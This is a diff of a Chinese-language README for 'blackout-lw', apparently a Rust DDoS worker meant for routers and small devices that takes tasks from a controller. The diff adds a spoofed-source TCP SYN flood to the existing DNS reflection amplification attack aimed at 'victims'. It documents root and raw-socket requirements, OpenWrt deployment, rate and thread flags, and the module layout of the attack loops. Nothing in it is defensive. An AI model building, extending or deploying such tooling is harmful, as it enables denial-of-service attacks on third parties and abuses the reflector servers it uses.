@@ -1,14 +1,20 @@
 # blackout-lw — Blackout 轻量伪造 Worker（Rust）
 
-路由器 / 低性能设备的 UDP 伪源反射放大节点。单二进制，scp 即跑，掉线就掉线（靠量取胜）。
+路由器 / 低性能设备的伪源攻击节点。单二进制，scp 即跑，掉线就掉线（靠量取胜）。
 
 ## 定位
 
-- **只做**：DNS 反射放大（伪源 UDP 查询 → 反射器大响应打到受害者）
-- **不做**：直连 L4/L7、challenge 两段式、热池、自更新（v1）
+- **只做**两件事（均由 Controller 决定派发顺序）：
+  1. **DNS 反射放大**（伪源 UDP 查询 → 反射器大响应打到受害者）— 优先
+  2. **伪源 TCP SYN 洪水**（raw socket 构造 SYN，随机伪源 IP/端口/序列号，堆积目标半开连接）— 无反射任务可派时回退
+- **不做**：直连 L4/L7（HTTP/2、TLS 等）、challenge 两段式、热池、自更新（v1）
 - **平台**：x86_64 / armv7 / aarch64 / mipsel（OpenWrt 路由器、软路由、树莓派）
 - **协议**：HTTP/1.1 + JSON 轮询直连 Controller 源站（明文，心跳 = 任务轮询）
 - **体积目标**：release + strip 后 < 600KB
+- **权限**：DNS/TCP 伪源均需 root（raw socket + IP_HDRINCL）
+
+> 两种方法都需要 raw socket：非 root 运行时任务会因 `raw socket failed (need root?)` 全部计入错误包，
+> 任务时长照常走完并在结束时上报（不会卡住 Controller 的任务队列）。
 
 ## 编译
 
@@ -54,7 +60,7 @@ chmod +x /etc/init.d/blackout-lw
 | `-c host:port` | Controller HTTP 地址（必填） |
 | `-t token` | worker token（必填） |
 | `-threads N` | 攻击线程数（默认 8，上限 256） |
-| `-pps N` | 每线程 PPS 上限（0 = 不限，默认 0） |
+| `-pps N` | **整机** PPS 上限（按线程均分，0 = 不限，默认 0） |
 
 ## 与 Controller 的接口
 
@@ -72,10 +78,10 @@ src/
 ├── main.rs       入口：参数解析 → 伪造自检 → 心跳循环
 ├── config.rs     配置（命令行参数）
 ├── http.rs       迷你 HTTP/1.1 客户端（零 TLS 依赖）
-├── heartbeat.rs  注册/心跳轮询/任务执行/上报
-├── spoof.rs      raw socket 伪源 UDP（IP_HDRINCL + 校验和）
+├── heartbeat.rs  注册/心跳轮询/任务执行（dns_reflector / tcp_syn）/上报
+├── spoof.rs      raw socket 伪源 UDP + 伪源 TCP SYN（IP_HDRINCL + 校验和）
 ├── dns.rs        DNS TXT 查询构造
 ├── reflector.rs  池拉取与条目解析
-├── attack.rs     反射攻击循环（多线程 + 原子统计）
+├── attack.rs     攻击循环（DNS 反射 / TCP SYN，多线程 + 原子统计）
 └── throttle.rs   PPS 节流 + /proc/loadavg 负载自适应降速
 ```
